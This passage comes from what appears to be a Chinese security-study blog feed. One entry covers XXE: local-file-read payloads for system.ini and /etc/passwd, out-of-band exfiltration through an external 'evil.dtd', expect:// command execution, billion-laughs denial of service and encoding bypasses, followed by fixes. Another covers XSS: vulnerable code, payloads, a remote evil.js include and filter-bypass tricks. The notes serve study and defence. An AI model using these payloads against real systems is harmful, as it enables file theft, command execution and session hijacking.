code</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % SuperClass &#x27;&gt;</span><br><span class="line">         &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error; &lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h5 id="嵌套参数实体"><a href="#嵌套参数实体" class="headerlink" title="嵌套参数实体"></a>嵌套参数实体</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605210541295.png" alt="image-20230605210541295"></p><p>不是所有的xml解析器都能解析嵌套参数实体</p><p><img src="/../images/image-20230606151226408.png" alt="image-20230606151226408"></p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///文件路径&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!-- 使用php的filter过滤器读取含有xml保留字符的文件 --&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY  rabbit SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;]&gt; </span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605193428910.png" alt="image-20230605193428910"></p><p>当不能使用过滤器时</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///f:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POST数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &amp;all是使用evil.dtd中的实体--&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;  </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605204320348.png" alt="image-20230605204320348"></p><h4 id="列目录–JAVA"><a href="#列目录–JAVA" class="headerlink" title="列目录–JAVA"></a>列目录–JAVA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607100242865.png" alt="image-20230607100242865"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;netdoc:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><h4 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://内网ip:port&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><blockquote><p>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://命令&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h4 id="DOS攻击–没成功过"><a href="#DOS攻击–没成功过" class="headerlink" title="DOS攻击–没成功过"></a>DOS攻击–没成功过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; </span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用<code>/dev/random</code>文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li><p>phar协议反序列化</p></li><li><p>利用EXCEL进行XXE攻击</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">解压xlsx文件，在[Content_Types].xml中插入payload</span><br><span class="line"></span><br><span class="line">打包为xlsx：zip -r xxe.xlsx *</span><br></pre></td></tr></table></figure></li><li><p>上传svg，docx等xml格式的文件进行攻击</p></li><li><p>java–jar协议解压压缩包</p></li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul><li><p>插入空格</p><p>可以在<code>&lt;?xml</code>或<code>&lt;!DOCTYPE</code>后插入任意数量的空格</p><p><img src="/../images/image-20230605205020027.png" alt="image-20230605205020027"></p></li><li><p>编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UTF-7</span><br><span class="line">UTF-16 BE，UTF-16 LE</span><br><span class="line">UTF-32 BE、UTF-32LE、UTF-322143、UTF-323412</span><br><span class="line">EBCDIC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-7 &gt; payload.7.xml</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606145117482.png" alt="image-20230606145117482"></p></li></ul><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">7.XXEinjector：一款功能强大的自动化XXE注射工具 - bmjoker - 博客园 (cnblogs.com)</a></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>禁用外部实体</li></ul><p>PHP: </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>); </span><br></pre></td></tr></table></figure><p>JAVA: </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SAXBuilder</span></span><br><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DocumentBuilder</span></span><br><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>  DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">documentBuilder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXReader</span></span><br><span class="line"><span class="type">SAXReader</span> <span class="variable">saxReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXTransformerFactory</span></span><br><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// TransformerFactory</span></span><br><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();      </span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmarshaller 默认方法不存在xxe漏洞</span></span><br></pre></td></tr></table></figure><p> Python： </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><ul><li>过滤用户提交的 XML 数据</li></ul><p>如过滤关键词：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 和&lt;!ENTITY，或者 SYSTEM 和 PUBLIC</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><p><a href="https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://xz.aliyun.com/t/6829#toc-4">https://xz.aliyun.com/t/6829#toc-4</a></p><p><strong>补充</strong>：<a href="https://tttang.com/archive/1813/#toc__2">https://tttang.com/archive/1813/#toc__2</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS</title>
      <link href="/2023/06/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS/"/>
      <url>/2023/06/01/Web%E5%AE%89%E5%85%A8%E4%B9%8BXSS/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>主要在 <a href="https://xz.aliyun.com/t/9606">https://xz.aliyun.com/t/9606</a> 基础上进行学习</p><h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p> <strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p><h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><ol><li>不正确的输入验证：当网站没有对用户提交的数据进行充分的验证和过滤时，恶意用户可以在输入中插入恶意代码。这些代码可能会被其他用户执行，导致XSS攻击。</li><li>不正确的输出编码：在将用户输入的数据输出到Web页面上时，如果没有进行适当的编码处理，浏览器可能会将其中的特殊字符解析为HTML或JavaScript代码，从而导致恶意脚本执行。</li></ol><h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ul><li>窃取用户的会话令牌或Cookie，并以用户的身份进行非法操作</li><li>构造钓鱼网站</li><li>xss盲打，持久化控制</li><li>可能造成蠕虫</li></ul><h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><p><img src="/../images/image-20230524205745342-1686840019396.png" alt="image-20230524205745342"></p><ul><li><p>反射型</p><p>用户输入什么网站返回什么，漏洞成型点在服务器端代码解析引擎</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// 直接将用户输入拼接到html中</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见场景：将用户输入进行回显的地方，攻击者通常要将构造好的url发送给受害者，受害者点击之后才会触发。</p><p>比如某站点搜索功能处存在反射xss，攻击者构造</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://test.com/search.php?key=&lt;img%20src=1%20onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>当用户点击该链接就会发生弹窗</p></li><li><p>存储型</p><p>用户输入的数据会先存储到数据库中，只要查询到数据库中的脏数据，这些数据回显到页面就会触发XSS，漏洞成型点在<strong>数据库</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防御sql注入（也不全，$name变量没有过滤）</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>( <span class="variable">$message</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 没有考虑到对 XSS 进行过滤,将xss数据存入数据库中</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="comment">// 查询，拼接，触发xss</span></span><br><span class="line">    xxxx；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见场景：评论，订单，个人信息修改（可以参考sql中的二次注入）</p></li><li><p>DOM型</p><p>与服务器无交互，漏洞成型点在**<code>javascript</code>文件解析用户输入时**，触发点在客户端渲染DOM时。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  lang 变量通过 document.location.href（当前页面的 URL）来获取</span></span><br><span class="line"><span class="keyword">var</span> lang = document.location.href.<span class="title function_ invoke__">substring</span>(document.location.href.<span class="title function_ invoke__">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 并且没有任何过滤就直接 URL 解码后输出在了 option 标签中</span></span><br><span class="line">document.<span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="variable">$decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>常见场景：需要审计<code>javascript</code>代码😪</p></li></ul><h1 id="如何执行javascript"><a href="#如何执行javascript" class="headerlink" title="如何执行javascript"></a>如何执行javascript</h1><ul><li>script标签</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>非script标签</p><ul><li><p>事件触发</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;&#x27;</span> onclick=<span class="string">&#x27;alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM 事件对象 | 菜鸟教程</a></p></li><li><p><code>javascript:</code>  </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">  &lt;a href=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1);</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">  &lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br><span class="line">  </span><br><span class="line">  //IE7以下</span><br><span class="line">&lt;img src=javascript:alert(1)&gt;    </span><br></pre></td></tr></table></figure></li><li><p><code>script</code>标签的src属性，引入外来js文件</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://xxx/evil.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>当空格被过滤了时，我们可以用 <code>/</code> 来代替空格：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><p>也可以：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure><h2 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">`xss`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx/evil.js</span>&gt;</span></span> &lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="绕过括号"><a href="#绕过括号" class="headerlink" title="绕过括号"></a>绕过括号</h2><ul><li>throw</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li>反引号</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>) == alert<span class="string">`1`</span></span><br></pre></td></tr></table></figure><h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;sCRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/sCrIpT&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h3><h4 id="利用eval-函数"><a href="#利用eval-函数" class="headerlink" title="利用eval()函数"></a>利用eval()函数</h4><p>与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">// 在js中，我们可以用反引号代替单双引号</span></span><br></pre></td></tr></table></figure><h4 id="利用top"><a href="#利用top" class="headerlink" title="利用top"></a>利用top</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">&quot;xss&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="根据输出点选择闭合方式"><a href="#根据输出点选择闭合方式" class="headerlink" title="根据输出点选择闭合方式"></a>根据输出点选择闭合方式</h2><p>WAF最大的问题，在于不知道输出的位置，导致攻击者根据具体环境以及具体输出的标签类型便可以绕过。</p><h3 id="输出在属性里"><a href="#输出在属性里" class="headerlink" title="输出在属性里"></a>输出在属性里</h3><p>例如输出的位置位于value属性中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input value=<span class="string">&quot;[输出]&quot;</span> 